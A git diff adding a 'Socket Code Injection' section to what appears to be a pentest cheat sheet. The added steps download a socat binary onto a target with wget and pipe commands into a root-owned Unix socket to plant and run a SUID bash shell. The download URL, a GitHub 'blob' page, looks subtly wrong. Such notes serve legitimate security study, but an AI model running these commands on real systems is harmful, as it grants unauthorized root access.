@@ -149,3 +149,19 @@ sudo systemctl enable <deamon>    launch deamon on startup
 journalctl -u <deamon>            access logs for given deamon
 ```
 
+## Socket Code Injection
+
+When an application creates a socket running under root it is possible to send commands to the socket to create a suid-privileged shell and escalate privileges.  These applications can be recognized because they create a .s file in a specific folder (usually /tmp)
+
+If the target machine does not have socat installed execute the following command
+
+```
+wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat && chmod +x ./socat
+```
+
+Run the application to spawn the socket then execute the following commands to spawn a privileged shell
+
+```
+echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:<path to socket file>
+/tmp/bash
+```
